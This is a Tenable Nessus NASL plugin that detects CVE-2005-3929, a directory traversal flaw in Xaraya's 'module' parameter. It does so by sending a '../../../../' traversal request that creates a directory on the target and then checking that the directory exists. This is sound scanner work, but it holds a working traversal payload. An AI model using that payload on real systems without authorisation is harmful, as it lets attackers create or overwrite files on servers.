#
# (C) Tenable Network Security
#


if (description) {
  script_id(20372);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-3929");
  script_bugtraq_id(15623);

  script_name(english:"Xaraya module Parameter Directory Traversal Vulnerability");
  script_summary(english:"Checks for module parameter directory traversal vulnerability in Xaraya");
 
  desc = "
Synopsis :

The remote web server contains a PHP script that is affected by a
directory traversal flaw. 

Description :

The version of Xaraya installed on the remote host does not sanitize
input to the 'module' parameter of the 'index.php' script before using
it to write to files on the affected host.  Using a specially-crafted
request, an unauthenticated attacker can create directories and
possibly overwrite arbitrary files on the affected host subject to the
permissions of the web server user id. 

See also :

http://www.milw0rm.com/id.php?id=1345
http://www.securityfocus.com/archive/1/archive/1/418209/100/0/threaded
http://www.xaraya.com/index.php/news/551

Solution : 

Upgrade to Xaraya 1.0.1 or later.

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:N/I:P/A:N/B:N)";
  script_description(english:desc);

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("xaraya_detection.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/xaraya"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit the flaw to create a directory under
  # Xaraya's 'var' directory.
  dirname = string(SCRIPT_NAME, "-", unixtime());
  req = http_get(
    item:string(
      dir, "/index.php?",
      "module=../../../../", dirname
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if the directory was created.
  #
  # nb: by not tacking on a trailing slash, we'll be able to detect
  #     whether the directory exists even if, say, Apache's autoindex
  #     feature is disabled.
  req = http_get(item:string(dir, "/var/", dirname), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (egrep(pattern:"^HTTP/.* 301 Moved", string:res)) {
    security_note(port);
    exit(0);
  }
}
